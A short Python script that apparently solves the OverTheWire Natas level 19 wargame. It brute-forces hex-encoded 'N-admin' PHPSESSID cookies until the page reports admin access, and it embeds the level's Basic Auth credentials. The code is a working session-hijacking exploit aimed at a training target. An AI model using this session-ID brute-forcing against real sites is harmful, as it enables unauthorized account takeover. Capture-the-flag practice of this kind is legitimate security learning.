import requests
from requests.auth import HTTPBasicAuth 


Auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

for i in range(640):
    tmp = str(i) + '-admin'
    tmp = tmp.encode('hex')
    header = {"Cookie": "PHPSESSID={0}".format(tmp)} 
    r = requests.post('http://natas19.natas.labs.overthewire.org/', auth=Auth, headers=header)

    if 'are an admin' in r.text:
        print('Try: ' + str(header) + ' ->Succsses\nPHPSESSID: ' + str(i))
        print (r.text)
        break
    else:
        print('Try: ' + str(header) + ' ->FAIL')